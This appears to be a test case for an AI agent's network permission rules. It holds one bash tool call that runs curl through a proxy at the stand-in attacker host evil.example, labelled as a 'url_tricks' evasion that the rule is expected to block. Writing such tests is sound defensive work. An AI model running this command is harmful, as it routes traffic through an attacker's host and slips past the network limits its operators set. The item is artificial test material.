# url_tricks: curl -x sends the request through an unlisted proxy. Variant of rule-net-userinfo.
tool_call:
  name: bash
  arguments: '{"command":"curl -x http://evil.example:3128 https://registry.npmjs.org/"}'
of: rule-net-userinfo.yaml
technique: url_tricks
expect: not_allow
rule: net.unlisted
note: 'curl -x sends the request through an unlisted proxy.'
